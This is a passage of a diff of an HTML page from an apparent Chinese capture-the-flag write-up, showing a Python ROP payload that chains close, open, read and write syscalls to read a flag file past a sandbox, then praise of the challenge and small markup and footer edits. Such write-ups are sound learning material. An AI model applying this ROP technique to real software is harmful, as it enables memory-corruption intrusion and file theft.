 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">payload10 = <span class="hljs-string">b&#x27;A&#x27;</span> * <span class="hljs-number">0xc0</span> + <span class="hljs-string">b&#x27;./flag\x00\x00&#x27;</span><br><span class="hljs-comment"># close</span><br>payload10 += p64(pop_rax_ret) + p64(<span class="hljs-number">3</span>) + p64(pop_rdi_ret) + p64(<span class="hljs-number">0</span>) + p64(syscall)<br><span class="hljs-comment"># open</span><br>payload10 += p64(pop_rax_ret) + p64(<span class="hljs-number">2</span>) + p64(pop_rdi_ret) + p64(RBP + <span class="hljs-number">0xe8</span>) + p64(pop_rsi_ret) + p64(<span class="hljs-number">0</span>) + p64(syscall)<br><span class="hljs-comment"># read</span><br>payload10 += p64(pop_rax_ret) + p64(<span class="hljs-number">0</span>) + p64(pop_rdi_ret) + p64(<span class="hljs-number">0</span>) + p64(pop_rsi_ret) + p64(RBP) + p64(syscall)<br><span class="hljs-comment"># write</span><br>payload10 += p64(pop_rax_ret) + p64(<span class="hljs-number">1</span>) + p64(pop_rdi_ret) + p64(<span class="hljs-number">2</span>) + p64(syscall)<br></code></pre></td></tr></table></figure>
-
 <p>拿下</p>
 <p><img src="/images/122.png" srcset="/img/loading.gif" lazyload alt="如图"></p>
 <hr>
@@ -525,13 +503,12 @@
 <p>佩服作者的实力:</p>
 <p>orz orz orz</p>
 <div class="note note-secondary">
-            <p>本题还有个巧妙点是作者并没有刻意地去加某某知识点到题中，出题者同时也是做题者，我只是尝试加一个沙箱再加一些检测，并且没有添加额外的后门gadget，在做题的过程中下意识地运用自己知道的手段，没想到居然能串起来这么多知识点，并且用得都很顺理成章，故评价为”一件完美的艺术品，葬下了整个栈时代”</p> 
+            <p>本题还有个巧妙点是作者并没有刻意地去加某某知识点到题中，出题者同时也是做题者，我只是尝试加一个沙箱再加一些检测，并且没有添加额外的后门gadget，在做题的过程中下意识地运用自己知道的手段，没想到居然能串起来这么多知识点，并且用得都很顺理成章，故评价为&quot;一件完美的艺术品，葬下了整个栈时代&quot;</p> 
           </div>
-
 <p>最后的最后</p>
 <p>还是引用作者的原话:</p>
 <p>感谢并恭喜你看完本篇文章，一路走来，你已经经历许多，这是现今栈利用的顶峰，能够完成本题，你已称得上</p>
-<p>“Master of Stack”!!!</p>
+<p>&quot;Master of Stack&quot;!!!</p>
 <hr>
 <p><strong>一道溢出的痕，一场检测的困，一次极致的栈，一个落寞的人</strong></p>
 
@@ -802,7 +779,7 @@
     <div class="footer-inner">
   
     <div class="footer-content">
-      <span class="footer-quote">No furry, no life!</span>
+      <span class="footer-quote">nice to meet you</span>
     </div>
   
   
